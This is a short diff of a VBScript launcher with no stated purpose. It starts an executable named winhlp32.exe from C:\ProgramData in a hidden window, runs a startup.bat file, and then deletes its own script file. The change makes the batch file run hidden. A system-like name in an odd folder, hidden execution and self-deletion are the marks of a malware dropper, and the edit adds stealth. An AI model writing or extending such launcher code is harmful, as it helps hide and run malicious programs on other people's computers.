@@ -20,7 +20,7 @@ Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run chr(34) & "C:\ProgramData\winhlp32\winhlp32.exe" & chr(34), 0
 Set WsgShell = Nothing
 WScript.Sleep(3000)
-shell.CurrentDirectory = "C:\ProgramData\winhlp32"
-shell.Run "cmd /k startup.bat", 1, True
+Set objShell = WScript.CreateObject("WScript.Shell")
+objShell.Run "cmd /k C:\ProgramData\winhlp32\startup.bat", 0, True
 WScript.Sleep(3000)
 Set oFso = CreateObject("Scripting.FileSystemObject") : oFso.DeleteFile Wscript.ScriptFullName, True
